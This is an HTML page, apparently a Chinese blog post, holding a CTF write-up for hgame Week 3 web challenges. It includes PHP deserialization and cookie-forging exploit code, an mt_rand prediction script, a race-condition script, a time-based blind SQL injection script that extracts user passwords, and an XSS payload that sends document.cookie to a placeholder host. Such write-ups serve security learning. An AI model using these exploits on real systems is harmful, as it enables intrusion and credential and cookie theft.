@@ -1,0 +1,510 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/HeadPortrait-32x32.ico">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/HeadPortrait-16x16.ico">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    hostname: new URL('http://www.xianfish.xyz').hostname,
+    root: '/',
+    scheme: 'Muse',
+    version: '7.7.0',
+    exturl: false,
+    sidebar: {"position":"right","display":"post","padding":18,"offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    comments: {"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: '',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}
+  };
+</script>
+
+  <meta name="description" content="序列之争 - Ordinal Scale这道题目是一个打怪升级，冲到第一就能够获得flag的web程序，F12大法看得到提示，可以得到源码，开始代码审计  主要代码有3个，index.php和game.php都是前端渲染相关的，游戏的主要处理代码都在cardinal.php中，整个代码读下来大概就是，开始游戏，传入姓名参数，进入game界面 –&amp;gt; 生成一个怪物，并将怪物信息经过一些拼接处理放">
+<meta name="keywords" content="CTFWEB">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hgame-Week3">
+<meta property="og:url" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/index.html">
+<meta property="og:site_name" content="Hi~">
+<meta property="og:description" content="序列之争 - Ordinal Scale这道题目是一个打怪升级，冲到第一就能够获得flag的web程序，F12大法看得到提示，可以得到源码，开始代码审计  主要代码有3个，index.php和game.php都是前端渲染相关的，游戏的主要处理代码都在cardinal.php中，整个代码读下来大概就是，开始游戏，传入姓名参数，进入game界面 –&amp;gt; 生成一个怪物，并将怪物信息经过一些拼接处理放">
+<meta property="og:locale" content="en">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/1.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/2.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/3.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/4.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/5.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/6.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/7.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/8.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/9.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/10.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/11.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/12.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/13.png">
+<meta property="og:image" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/20200217.jpg">
+<meta property="og:updated_time" content="2020-02-17T13:59:06.821Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="hgame-Week3">
+<meta name="twitter:description" content="序列之争 - Ordinal Scale这道题目是一个打怪升级，冲到第一就能够获得flag的web程序，F12大法看得到提示，可以得到源码，开始代码审计  主要代码有3个，index.php和game.php都是前端渲染相关的，游戏的主要处理代码都在cardinal.php中，整个代码读下来大概就是，开始游戏，传入姓名参数，进入game界面 –&amp;gt; 生成一个怪物，并将怪物信息经过一些拼接处理放">
+<meta name="twitter:image" content="http://www.xianfish.xyz/2020/02/17/hgame-Week3/1.png">
+
+<link rel="canonical" href="http://www.xianfish.xyz/2020/02/17/hgame-Week3/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true
+  };
+</script>
+
+  <title>hgame-Week3 | Hi~</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Hi~</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+        <p class="site-subtitle">人生总有各种理由将一个人变成一个five!</p>
+  </div>
+
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>Home</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>Tags</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>Archives</a>
+
+  </li>
+  </ul>
+
+</nav>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="en">
+    <link itemprop="mainEntityOfPage" href="http://www.xianfish.xyz/2020/02/17/hgame-Week3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/HeadPortrait.png">
+      <meta itemprop="name" content="瑟瑟发抖咸鱼黄">
+      <meta itemprop="description" content="您看！工具人啥都不配拥有!">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Hi~">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          hgame-Week3
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-02-17 20:53:40 / Modified: 21:59:06" itemprop="dateCreated datePublished" datetime="2020-02-17T20:53:40+08:00">2020-02-17</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h1 id="序列之争-Ordinal-Scale"><a href="#序列之争-Ordinal-Scale" class="headerlink" title="序列之争 - Ordinal Scale"></a>序列之争 - Ordinal Scale</h1><p>这道题目是一个打怪升级，冲到第一就能够获得flag的web程序，F12大法看得到提示，可以得到源码，开始代码审计</p>
+<p><img src="/2020/02/17/hgame-Week3/1.png" alt="1"></p>
+<p>主要代码有3个，index.php和game.php都是前端渲染相关的，游戏的主要处理代码都在cardinal.php中，整个代码读下来大概就是，开始游戏，传入姓名参数，进入game界面 –&gt; 生成一个怪物，并将怪物信息经过一些拼接处理放入cookie的moster中，点击页面的挑战按钮，开始打怪，比较人物和怪物的等级，等级低者获胜，人物获胜可以随机获得等级(排名)上升和经验值<a id="more"></a></p>
+<p><img src="/2020/02/17/hgame-Week3/2.png" alt="2"></p>
+<p>但是这里后台做了处理，人物排名最高就为2，所以需要想办法开挂绕过，毕竟桐老爷不也是开挂才赢的吗？手动滑稽.jpg</p>
+<p><img src="/2020/02/17/hgame-Week3/3.png" alt="3"></p>
+<p>明白了整体流程，开始寻找突破口,我们前面已经知道，页面加载会产生怪物信息，经过处理放入cookie中，找到相关处理代码，进行了序列化</p>
+<p><img src="/2020/02/17/hgame-Week3/4.png" alt="4"></p>
+<p>并且在moster类里面也存在反序列化的操作，从这个题目的名字和这里，大概率是要利用反序列化漏洞了</p>
+<p><img src="/2020/02/17/hgame-Week3/5.png" alt="5"></p>
+<p>现在开始分析一下，这个cookie中monster的构成</p>
+<p><code>setcookie(&#39;monster&#39;, base64_encode(serialize($this-&gt;monsterData) . $sign));</code></p>
+<p>这句代码首先将monsterData这个参数序列化</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$this-&gt;monsterData = array(</span><br><span class="line">      &apos;name&apos; =&gt; $monsterName[array_rand($monsterName, 1)],//随机或者一个怪物名字</span><br><span class="line">      &apos;no&apos; =&gt; rand(1, 2000),//随机产生一个no，数量？？战斗力？？=&gt;怪物等级</span><br><span class="line">    );</span><br></pre></td></tr></table></figure>
+<p>序列化后，在和sign字符串进行拼接，sign这段字符是将序列化的monsterData与一个密钥拼接后md5加密的值</p>
+<p>最后再将拼接起来的字符串base64 encode后放入了cookie中</p>
+<p><img src="/2020/02/17/hgame-Week3/6.png" alt="6"></p>
+<p>但是在这里我们想要构造cookie，去利用反序列化在这里出现了一些限制</p>
+<p>在代码的unserialize之前会有一个检查的操作</p>
+<p><img src="/2020/02/17/hgame-Week3/7.png" alt="7"></p>
+<p>这里就需要我们知道encryptKey的值，继续读代码，encryptKey来源于game类的sign属性，找到了一处可利用的地方</p>
+<p><img src="/2020/02/17/hgame-Week3/8.png" alt="8"></p>
+<p>这里传入的data参数为数组[$playerName, $this-&gt;encryptKey]，元素中含有 encryptKey 。 分析⼀下这个⽅法的功能，这个 init() ⽅法是⽤来初始化欢迎语 welcomeMsg 以及 sign 。 其中欢迎语 welcomeMsg 的⽣成中使⽤了 sprintf 函数，且放在⼀个循环内，第⼆轮循环的 $value 值 即为 encryptKey 。因此存在格式化字符串漏洞。 </p>
+<p>进⼊游戏，输⼊名字： %s ，即可使得在第⼆轮循环中 %s 的值被 sprintf 函数换成 encryptKey 。</p>
+<p>点 击 Link Start，就可以拿到 encryptKey </p>
+<p><img src="/2020/02/17/hgame-Week3/9.png" alt="9"></p>
+<p>接下来就是利用反序列化来构造cookie，但 Rank 类的析构函数：</p>
+<p><img src="/2020/02/17/hgame-Week3/10.png" alt="10"></p>
+<p> 在设置 Session 前会⽐对 key 以及 serverKey 的值，其中 serverKey 是来⾃于服务器的环境变量，这 个值我们⽆法获得。这里我们在构造exp的时候，直接不设置$key属性，直接构造一个Rank类，反序列化时就会直接读取Rank类中的默认属性，exp:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Rank</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> $rank = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $data = [<span class="string">'xianyu'</span>,<span class="string">'gkUFUa7GfPQui3DGUTHX6XIUS3ZAmClL'</span>];</span><br><span class="line">    $sign = <span class="string">''</span>;</span><br><span class="line">    <span class="keyword">foreach</span>($data <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        $sign .= md5($sign . $value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">$rank = serialize(<span class="keyword">new</span> Rank());</span><br><span class="line"><span class="keyword">echo</span>(base64_encode($rank . md5($rank . $sign)));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>得到cookie，使用xianyu进入game，替换掉</p>
+<p><code>Tzo0OiJSYW5rIjoxOntzOjEwOiIAUmFuawByYW5rIjtpOjE7fTAyY2Q3YmU2OGVlZTYxZTlhNGZhOWYxNjUyOTcwZmNj</code></p>
+<p><img src="/2020/02/17/hgame-Week3/11.png" alt="11"></p>
+<h1 id="二发入魂！"><a href="#二发入魂！" class="headerlink" title="二发入魂！"></a>二发入魂！</h1><p>直接放参考资料</p>
+<p><a href="https://ambionics.io/blog/php-mt-rand-prediction" target="_blank" rel="noopener">https://ambionics.io/blog/php-mt-rand-prediction</a></p>
+<p><a href="https://github.com/ambionics/mt_rand-reverse" target="_blank" rel="noopener">https://github.com/ambionics/mt_rand-reverse</a></p>
+<p>github上提供了计算脚本，写exp的时候调用脚本来计算</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">s = requests.session()</span><br><span class="line">url = <span class="string">"https://twoshot.hgame.n3ko.co/random.php?times=228"</span></span><br><span class="line">cookie = &#123;<span class="string">'PHPSESSID'</span>:<span class="string">'5j6ubh4n8t69oqk1gd4gj2jti1'</span>&#125;</span><br><span class="line">c = s.get(url,cookies = cookie)</span><br><span class="line">ans = str(c.text)</span><br><span class="line">ans = eval(ans)</span><br><span class="line">R0 = ans[<span class="number">0</span>]</span><br><span class="line">R227 = ans[<span class="number">227</span>]</span><br><span class="line">req = <span class="string">'python reverse_mt_rand.py '</span>+str(R0)+<span class="string">' '</span>+str(R227)+<span class="string">' 0 0'</span></span><br><span class="line">p = os.popen(req)</span><br><span class="line">x = p.read()</span><br><span class="line">p.close()</span><br><span class="line">x = str(x.replace(<span class="string">'\n'</span>,<span class="string">''</span>))</span><br><span class="line">url2 = <span class="string">"https://twoshot.hgame.n3ko.co/verify.php"</span></span><br><span class="line">data = &#123;<span class="string">"ans"</span>:x&#125;</span><br><span class="line">final = s.post(url = url2,cookies = cookie,data = data)</span><br><span class="line">print(final.text)</span><br></pre></td></tr></table></figure>
+<p>But，难受的事情来了，不知道是我电脑计算能力不够，没办法在两秒钟算出来，还是什么原因，无法获取到flag，难受.jpg</p>
+<h1 id="Cosmos的二手市场"><a href="#Cosmos的二手市场" class="headerlink" title="Cosmos的二手市场"></a>Cosmos的二手市场</h1><p>这道题登陆进入之后，是一个物品交易平台，购买物品后可以卖出，但是卖出时会收取一定比例的费用，</p>
+<p>主要的考察点就是条件竞争，关于这方面的知识点，搜索一下就有很多</p>
+<p>可以使用bp的爆破，分别为购买和卖出设置不同线程(卖出&gt;购入)，同时卖出量也要大于购入量，就可以触发条件竞争，获得更多的收益，达到要求后就可以得到flag</p>
+<p>同时也可以直接写脚本，官方提供的exp：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">worker</span><span class="params">(i,data)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        url = <span class="string">"&#123;&#125;?method=solve"</span>.format(host)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        url = <span class="string">"&#123;&#125;?method=buy"</span>.format(host)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s.post(url=url,data=data)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        print(<span class="string">"请求失败"</span>)</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">host = <span class="string">"http://121.36.88.65:9999/API/"</span></span><br><span class="line">user = &#123;</span><br><span class="line">    <span class="string">"name"</span> : <span class="string">"five"</span>,</span><br><span class="line">    <span class="string">"password"</span> : <span class="string">"123456"</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">s = requests.session()</span><br><span class="line">s.post(url=<span class="string">"&#123;&#125;?method=login"</span>.format(host), data = user)</span><br><span class="line"></span><br><span class="line">i = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">"code"</span>: <span class="string">"800001"</span>,</span><br><span class="line">        <span class="string">"amount"</span>: <span class="string">"50"</span></span><br><span class="line">    &#125;</span><br><span class="line">    info = json.loads(s.get(<span class="string">"&#123;&#125;?method=getinfo"</span>.format(host)).text)</span><br><span class="line">    money = info[<span class="string">'data'</span>][<span class="string">'money'</span>]</span><br><span class="line">    properties = info[<span class="string">'data'</span>][<span class="string">'properties'</span>]</span><br><span class="line">    print(money)</span><br><span class="line">    print(properties)</span><br><span class="line">    <span class="keyword">if</span> money &gt; <span class="number">100000000</span>:</span><br><span class="line">        print(s.get(<span class="string">"&#123;&#125;?method=getflag"</span>.format(host)).text)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> i % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        amount = int(properties[<span class="number">0</span>][<span class="string">'amount'</span>])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        amount = money // <span class="number">1000</span></span><br><span class="line">    <span class="keyword">if</span> amount &gt; <span class="number">500</span>:</span><br><span class="line">        amount = <span class="number">500</span></span><br><span class="line">    data[<span class="string">'amount'</span>] = amount</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">30</span>):</span><br><span class="line">        t = threading.Thread(target=worker,args=(i,data))</span><br><span class="line">        t.start()</span><br><span class="line">    </span><br><span class="line">    time.sleep(<span class="number">5</span>)</span><br><span class="line">    i += <span class="number">1</span></span><br></pre></td></tr></table></figure>
+<h1 id="Cosmos的留言板-2"><a href="#Cosmos的留言板-2" class="headerlink" title="Cosmos的留言板-2"></a>Cosmos的留言板-2</h1><p>登陆留言板后，删除留言处存在盲注，这里使用的是基于时间的盲注</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">result = <span class="string">""</span></span><br><span class="line">cookie =&#123;<span class="string">"PHPSESSID"</span>:<span class="string">"01b9hcfu09budsjeeg651vef3h"</span>&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    print(<span class="string">"正在测试第"</span>,i)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">37</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="comment">#url = "http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=if(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)%3ddatabase()),"+str(i)+",1))%3d"+str(j)+",sleep(5),1)%23"</span></span><br><span class="line">        <span class="comment">#messages,user</span></span><br><span class="line">        <span class="comment">#url = "http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)%3d'messages'),"+str(i)+",1))%3d"+str(j)+",sleep(5),1)%23"</span></span><br><span class="line">        <span class="comment">#message_id,user_id,message</span></span><br><span class="line">        <span class="comment">#url = "http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=if(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)%3d'user'),"+str(i)+",1))%3d"+str(j)+",sleep(5),1)%23"</span></span><br><span class="line">        <span class="comment">#id,name,password</span></span><br><span class="line">        <span class="comment">#url = "http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=if(ascii(substr((select(group_concat(id))from(user)),"+str(i)+",1))%3d"+str(j)+",sleep(5),1)%23"</span></span><br><span class="line">        <span class="comment">#1,2,3,4,5,6,7......</span></span><br><span class="line">        <span class="comment">#url = "http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=if(ascii(substr((select(group_concat(name))from(user)),"+str(i)+",1))%3d"+str(j)+",sleep(5),1)%23"</span></span><br><span class="line">        <span class="comment">#cosmos,yd0ng,admin1,gug......</span></span><br><span class="line">        <span class="comment">#url = "http://139.199.182.61:19999/index.php?method=delete&amp;delete_id=if(ascii(substr((select(group_concat(password))from(user)),"+str(i)+",1))%3d"+str(j)+",sleep(5),1)%23"</span></span><br><span class="line">        <span class="comment"># f1FXOCnj26Fkadzt4Sqynf6O7CgR,yd0ng,admin1,jing......</span></span><br><span class="line">        </span><br><span class="line">        one_time = time.time()</span><br><span class="line">        r = requests.get(url,cookies=cookie)</span><br><span class="line">        <span class="comment">#print(r.text)</span></span><br><span class="line">        two_time = time.time()</span><br><span class="line">        <span class="keyword">if</span> two_time-one_time &gt;= <span class="number">5</span>:</span><br><span class="line">            result = result+chr(j)</span><br><span class="line">            print(<span class="string">'answer:'</span>,result)</span><br></pre></td></tr></table></figure>
+<p>然后就可以得到用户名和密码，用Cosmos的用户名和密码登陆，就可以在留言板看到flag</p>
+<p>hgame{sQl_InjEct10n_iS_e4sY!!}</p>
+<h1 id="Cosmos的聊天室2-0"><a href="#Cosmos的聊天室2-0" class="headerlink" title="Cosmos的聊天室2.0"></a>Cosmos的聊天室2.0</h1><p>第二周题目的加强版，过滤了script字符串，双写就可以绕过，同时绕过过滤后，并没有正常执行xss，在控制台中也发现了一些警告</p>
+<p><img src="/2020/02/17/hgame-Week3/12.png" alt="12"></p>
+<p>从警告可以知道我们输入的内容被Content Security Policy给拦截了emmm，其拦截策略为，限制内联js和应用静态资源时只能同源中加载，而这道题恰好给我们提供了一个，发送信息到留言板的功能，这里会返回，过滤后的脚本</p>
+<p><img src="/2020/02/17/hgame-Week3/13.png" alt="13"></p>
+<p>这个发送功能由/send这个接口提供，所以我们就发给机器人的脚本中，就可以让机器人带着我们的payload去调用这个接口，</p>
+<p>如：<code>&lt;scrscriptipt src=&quot;/send?message=alert(123)&quot;&gt;&lt;/scrscriptipt&gt;</code></p>
+<p>所以这里我们的payload为：</p>
+<p>很难受，我构造的全部失败了，持续等大佬WP</p>
+<p>在vps上起一个web服务，用于接收</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_world</span><span class="params">()</span>:</span></span><br><span class="line"> response = make_response(<span class="string">"&lt;script&gt;window.open('http://IP/'+document.cookie)&lt;/script&gt;"</span>)</span><br><span class="line"> response.headers[<span class="string">'Access-Control-Allow-Origin'</span>] = <span class="string">'*'</span></span><br><span class="line"> <span class="keyword">return</span> response</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line"> app.run(host=<span class="string">"0.0.0.0"</span>,port=<span class="number">80</span>)</span><br></pre></td></tr></table></figure>
+<h1 id="At-last"><a href="#At-last" class="headerlink" title="At last"></a>At last</h1><p> <img src="/2020/02/17/hgame-Week3/20200217.jpg" alt="20200217"></p>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/CTFWEB/" rel="tag"># CTFWEB</a>
+          </div>
+
+        
+
+
+        
+    <div class="post-nav">
+      <div class="post-nav-item">
+    <a href="/2020/02/17/20200217/" rel="prev" title="20200217">
+      <i class="fa fa-chevron-left"></i> 20200217
+    </a></div>
+      <div class="post-nav-item">
+    <a href="/2020/02/17/hgame-Week1And2/" rel="next" title="hgame-Week1And2">
+      hgame-Week1And2 <i class="fa fa-chevron-right"></i>
+    </a></div>
+    </div>
+      </footer>
+    
+  </article>
+  
+  
+  
+
+  </div>
+
+
+          </div>
+          
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let activeClass = CONFIG.comments.activeClass;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      let commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+
+        </div>
+          
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line toggle-line-first"></span>
+    <span class="toggle-line toggle-line-middle"></span>
+    <span class="toggle-line toggle-line-last"></span>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
